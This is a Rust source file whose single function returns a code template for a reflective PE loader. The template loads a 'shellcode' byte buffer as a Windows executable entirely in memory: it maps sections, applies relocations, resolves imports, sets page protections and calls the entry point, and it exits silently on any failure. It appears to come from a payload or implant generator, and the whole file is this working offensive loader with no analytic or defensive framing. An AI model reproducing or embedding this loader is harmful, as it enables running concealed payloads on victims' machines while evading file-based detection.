pub fn pe_load_snippet() -> String {
    r#"    // Reflective PE Loader
    {
        use windows_sys::Win32::System::Memory::*;
        use windows_sys::Win32::System::LibraryLoader::*;
        use windows_sys::Win32::Foundation::*;
        use std::ffi::c_void;

        let pe_bytes = &shellcode;

        // SAFETY: PE parsing with bounds-checked offsets
        unsafe {
            // Parse DOS header
            if pe_bytes.len() < 64 { std::process::exit(0); }
            let e_lfanew = u32::from_le_bytes([
                pe_bytes[0x3C], pe_bytes[0x3D], pe_bytes[0x3E], pe_bytes[0x3F]
            ]) as usize;

            if pe_bytes.len() < e_lfanew + 0x18 { std::process::exit(0); }

            // Parse NT headers (PE signature + File Header + Optional Header)
            let pe_sig = u32::from_le_bytes([
                pe_bytes[e_lfanew], pe_bytes[e_lfanew+1],
                pe_bytes[e_lfanew+2], pe_bytes[e_lfanew+3]
            ]);
            if pe_sig != 0x00004550 { std::process::exit(0); } // "PE\0\0"

            let file_header_offset = e_lfanew + 4;
            let number_of_sections = u16::from_le_bytes([
                pe_bytes[file_header_offset + 2], pe_bytes[file_header_offset + 3]
            ]) as usize;
            let optional_header_size = u16::from_le_bytes([
                pe_bytes[file_header_offset + 16], pe_bytes[file_header_offset + 17]
            ]) as usize;

            let optional_header_offset = file_header_offset + 20;

            // Get image size and preferred base from optional header
            let image_size = u32::from_le_bytes([
                pe_bytes[optional_header_offset + 56], pe_bytes[optional_header_offset + 57],
                pe_bytes[optional_header_offset + 58], pe_bytes[optional_header_offset + 59],
            ]) as usize;
            let preferred_base = u64::from_le_bytes([
                pe_bytes[optional_header_offset + 24], pe_bytes[optional_header_offset + 25],
                pe_bytes[optional_header_offset + 26], pe_bytes[optional_header_offset + 27],
                pe_bytes[optional_header_offset + 28], pe_bytes[optional_header_offset + 29],
                pe_bytes[optional_header_offset + 30], pe_bytes[optional_header_offset + 31],
            ]);
            let entry_point_rva = u32::from_le_bytes([
                pe_bytes[optional_header_offset + 16], pe_bytes[optional_header_offset + 17],
                pe_bytes[optional_header_offset + 18], pe_bytes[optional_header_offset + 19],
            ]) as usize;

            // Allocate memory for the PE image
            let base_addr = VirtualAlloc(
                preferred_base as *const c_void,
                image_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );
            let base_addr = if base_addr.is_null() {
                // Try at any address if preferred base is taken
                VirtualAlloc(
                    std::ptr::null(),
                    image_size,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE,
                )
            } else {
                base_addr
            };
            if base_addr.is_null() { std::process::exit(0); }

            let base = base_addr as *mut u8;
            let actual_base = base_addr as u64;

            // Copy PE headers
            let headers_size = u32::from_le_bytes([
                pe_bytes[optional_header_offset + 60], pe_bytes[optional_header_offset + 61],
                pe_bytes[optional_header_offset + 62], pe_bytes[optional_header_offset + 63],
            ]) as usize;
            std::ptr::copy_nonoverlapping(
                pe_bytes.as_ptr(),
                base,
                headers_size.min(pe_bytes.len()),
            );

            // Copy sections
            let sections_offset = optional_header_offset + optional_header_size;
            for i in 0..number_of_sections {
                let sec_offset = sections_offset + (i * 40);
                if sec_offset + 40 > pe_bytes.len() { break; }

                let virtual_address = u32::from_le_bytes([
                    pe_bytes[sec_offset + 12], pe_bytes[sec_offset + 13],
                    pe_bytes[sec_offset + 14], pe_bytes[sec_offset + 15],
                ]) as usize;
                let raw_data_size = u32::from_le_bytes([
                    pe_bytes[sec_offset + 16], pe_bytes[sec_offset + 17],
                    pe_bytes[sec_offset + 18], pe_bytes[sec_offset + 19],
                ]) as usize;
                let raw_data_ptr = u32::from_le_bytes([
                    pe_bytes[sec_offset + 20], pe_bytes[sec_offset + 21],
                    pe_bytes[sec_offset + 22], pe_bytes[sec_offset + 23],
                ]) as usize;

                if raw_data_size > 0 && raw_data_ptr + raw_data_size <= pe_bytes.len() {
                    std::ptr::copy_nonoverlapping(
                        pe_bytes[raw_data_ptr..].as_ptr(),
                        base.add(virtual_address),
                        raw_data_size,
                    );
                }
            }

            // Apply base relocations if loaded at different address
            let delta = actual_base as i64 - preferred_base as i64;
            if delta != 0 {
                // Relocation directory is at optional_header_offset + 152 (for PE32+)
                let reloc_rva = u32::from_le_bytes([
                    pe_bytes[optional_header_offset + 152], pe_bytes[optional_header_offset + 153],
                    pe_bytes[optional_header_offset + 154], pe_bytes[optional_header_offset + 155],
                ]) as usize;
                let reloc_size = u32::from_le_bytes([
                    pe_bytes[optional_header_offset + 156], pe_bytes[optional_header_offset + 157],
                    pe_bytes[optional_header_offset + 158], pe_bytes[optional_header_offset + 159],
                ]) as usize;

                if reloc_rva > 0 && reloc_size > 0 {
                    let mut offset = 0;
                    while offset < reloc_size {
                        let block_base = base.add(reloc_rva + offset);
                        let page_rva = u32::from_le_bytes([
                            *block_base, *block_base.add(1),
                            *block_base.add(2), *block_base.add(3),
                        ]) as usize;
                        let block_size = u32::from_le_bytes([
                            *block_base.add(4), *block_base.add(5),
                            *block_base.add(6), *block_base.add(7),
                        ]) as usize;
                        if block_size == 0 { break; }

                        let entry_count = (block_size - 8) / 2;
                        for j in 0..entry_count {
                            let entry_ptr = block_base.add(8 + j * 2);
                            let entry = u16::from_le_bytes([*entry_ptr, *entry_ptr.add(1)]);
                            let reloc_type = (entry >> 12) & 0xF;
                            let reloc_offset = (entry & 0xFFF) as usize;

                            if reloc_type == 10 { // IMAGE_REL_BASED_DIR64
                                let patch_addr = base.add(page_rva + reloc_offset) as *mut u64;
                                let current = std::ptr::read_unaligned(patch_addr);
                                std::ptr::write_unaligned(patch_addr, (current as i64 + delta) as u64);
                            }
                        }
                        offset += block_size;
                    }
                }
            }

            // Resolve imports
            let import_rva = u32::from_le_bytes([
                pe_bytes[optional_header_offset + 120], pe_bytes[optional_header_offset + 121],
                pe_bytes[optional_header_offset + 122], pe_bytes[optional_header_offset + 123],
            ]) as usize;

            if import_rva > 0 {
                let mut import_offset = 0;
                loop {
                    let desc_ptr = base.add(import_rva + import_offset);
                    let original_first_thunk = u32::from_le_bytes([
                        *desc_ptr, *desc_ptr.add(1), *desc_ptr.add(2), *desc_ptr.add(3),
                    ]);
                    let name_rva = u32::from_le_bytes([
                        *desc_ptr.add(12), *desc_ptr.add(13), *desc_ptr.add(14), *desc_ptr.add(15),
                    ]);
                    let first_thunk = u32::from_le_bytes([
                        *desc_ptr.add(16), *desc_ptr.add(17), *desc_ptr.add(18), *desc_ptr.add(19),
                    ]);

                    if name_rva == 0 { break; }

                    // Get DLL name
                    let dll_name_ptr = base.add(name_rva as usize);
                    let dll_name_cstr = std::ffi::CStr::from_ptr(dll_name_ptr as *const i8);
                    let dll_name_wide: Vec<u16> = dll_name_cstr.to_string_lossy()
                        .encode_utf16().chain(std::iter::once(0)).collect();

                    let dll_handle = LoadLibraryW(dll_name_wide.as_ptr());
                    if dll_handle.is_null() {
                        import_offset += 20;
                        continue;
                    }
                    let dll_mod = dll_handle;

                    // Walk thunk array
                    let lookup_rva = if original_first_thunk != 0 {
                        original_first_thunk as usize
                    } else {
                        first_thunk as usize
                    };

                    let mut thunk_idx = 0;
                    loop {
                        let lookup_ptr = base.add(lookup_rva + thunk_idx * 8) as *const u64;
                        let thunk_data = std::ptr::read_unaligned(lookup_ptr);
                        if thunk_data == 0 { break; }

                        let func_addr = if thunk_data & (1u64 << 63) != 0 {
                            // Import by ordinal
                            let ordinal = (thunk_data & 0xFFFF) as u16;
                            GetProcAddress(dll_mod, ordinal as *const u8)
                        } else {
                            // Import by name
                            let hint_name_rva = (thunk_data & 0x7FFFFFFF) as usize;
                            let func_name_ptr = base.add(hint_name_rva + 2);
                            GetProcAddress(dll_mod, func_name_ptr)
                        };

                        if let Some(addr) = func_addr {
                            let iat_entry = base.add(first_thunk as usize + thunk_idx * 8) as *mut u64;
                            std::ptr::write_unaligned(iat_entry, addr as u64);
                        }

                        thunk_idx += 1;
                    }

                    import_offset += 20;
                }
            }

            // Set section protections
            for i in 0..number_of_sections {
                let sec_offset = sections_offset + (i * 40);
                if sec_offset + 40 > pe_bytes.len() { break; }

                let virtual_address = u32::from_le_bytes([
                    pe_bytes[sec_offset + 12], pe_bytes[sec_offset + 13],
                    pe_bytes[sec_offset + 14], pe_bytes[sec_offset + 15],
                ]) as usize;
                let virtual_size = u32::from_le_bytes([
                    pe_bytes[sec_offset + 8], pe_bytes[sec_offset + 9],
                    pe_bytes[sec_offset + 10], pe_bytes[sec_offset + 11],
                ]) as usize;
                let characteristics = u32::from_le_bytes([
                    pe_bytes[sec_offset + 36], pe_bytes[sec_offset + 37],
                    pe_bytes[sec_offset + 38], pe_bytes[sec_offset + 39],
                ]);

                let protection = match (
                    characteristics & 0x20000000 != 0, // execute
                    characteristics & 0x40000000 != 0, // read
                    characteristics & 0x80000000 != 0, // write
                ) {
                    (true, true, true) => PAGE_EXECUTE_READWRITE,
                    (true, true, false) => PAGE_EXECUTE_READ,
                    (true, false, false) => PAGE_EXECUTE,
                    (false, true, true) => PAGE_READWRITE,
                    (false, true, false) => PAGE_READONLY,
                    _ => PAGE_READWRITE,
                };

                if virtual_size > 0 {
                    let mut old = 0u32;
                    VirtualProtect(
                        base.add(virtual_address) as *const c_void,
                        virtual_size,
                        protection,
                        &mut old,
                    );
                }
            }

            // Call entry point
            if entry_point_rva > 0 {
                type DllMainFn = unsafe extern "system" fn(*mut c_void, u32, *mut c_void) -> i32;
                let entry: DllMainFn = std::mem::transmute(base.add(entry_point_rva));
                entry(base_addr, 1 /* DLL_PROCESS_ATTACH */, std::ptr::null_mut());
            }
        }
    }"#
    .to_string()
}
